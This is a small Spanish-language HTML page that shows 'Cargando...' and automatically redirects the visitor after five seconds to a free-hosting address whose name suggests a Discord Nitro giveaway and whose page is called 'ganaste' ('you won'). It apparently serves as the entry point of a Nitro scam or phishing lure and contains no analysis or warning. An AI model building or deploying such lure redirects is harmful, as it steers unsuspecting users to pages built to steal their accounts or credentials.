<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirección en 5 segundos</title>
<script>
    // Función para redireccionar después de 5 segundos
    function redireccionar() {
        setTimeout(function() {
            window.location.href = "https://discordsingreclaimgitfornitro.000webhostapp.com/ganaste.html"; // Cambia "pagina_destino.html" por la URL de la página a la que quieres redirigir
        }, 5000); // 5000 milisegundos = 5 segundos
    }
    
    // Llamar a la función redireccionar cuando se carga la página
    window.onload = redireccionar;
</script>
</head>
<body>
    <!-- Puedes agregar aquí cualquier contenido que quieras mostrar antes de la redirección -->
    <h1>Cargando...</h1>
</body>
</html>
